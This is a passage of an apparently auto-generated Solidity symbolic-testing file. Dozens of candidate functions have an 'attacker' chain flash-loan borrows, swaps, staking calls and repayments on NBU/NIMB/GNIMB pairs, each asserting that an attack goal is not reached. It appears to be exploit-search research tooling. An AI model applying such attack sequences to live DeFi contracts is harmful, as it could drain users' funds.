        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1554(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1555(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1556(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1557(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1558(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1559(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1560(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1561(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1562(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1563(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1564(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1565(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1566(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1567(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1568(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1569(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1570(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1571(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1572(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1573(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1574(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1575(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1576(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1577(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1578(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1579(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1580(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1581(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1582(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1583(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1584(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1585(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1586(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1587(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1588(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1589(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1590(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1591(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1592(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1593(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1594(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1595(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1596(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1597(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1598(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1599(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nbu(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1600(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nbu(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1601(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1602(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1603(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1604(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1605(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
